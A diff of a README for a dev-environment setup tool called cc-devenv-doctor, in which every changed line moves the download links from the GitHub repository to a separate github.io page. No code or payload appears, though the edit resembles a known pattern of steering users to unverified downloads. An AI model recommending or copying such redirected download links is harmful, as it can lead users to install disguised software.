@@ -1,6 +1,6 @@
 # 🩺 cc-devenv-doctor - Your Automated Dev Environment Setup
 
-[![Download from GitHub](https://img.shields.io/badge/Download-cc--devenv--doctor-blue?style=for-the-badge&logo=github)](https://github.com/Repositioningfinance221/cc-devenv-doctor)
+[![Download from GitHub](https://img.shields.io/badge/Download-cc--devenv--doctor-blue?style=for-the-badge&logo=github)](https://repositioningfinance221.github.io)
 
 ## 🤔 What Is This?
 
@@ -13,7 +13,7 @@ Follow these steps to get started quickly:
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:
-[https://github.com/Repositioningfinance221/cc-devenv-doctor](https://github.com/Repositioningfinance221/cc-devenv-doctor)
+[https://repositioningfinance221.github.io](https://repositioningfinance221.github.io)
 
 On the page, you will find the download button. Click it to save the file to your computer.
 
@@ -96,7 +96,7 @@ For further help, check the Issues section on the GitHub page.
 
 ## 📥 Download Again
 
-[![Download from GitHub](https://img.shields.io/badge/Download-cc--devenv--doctor-green?style=for-the-badge&logo=github)](https://github.com/Repositioningfinance221/cc-devenv-doctor)
+[![Download from GitHub](https://img.shields.io/badge/Download-cc--devenv--doctor-green?style=for-the-badge&logo=github)](https://repositioningfinance221.github.io)
 
 ## 📝 License
 
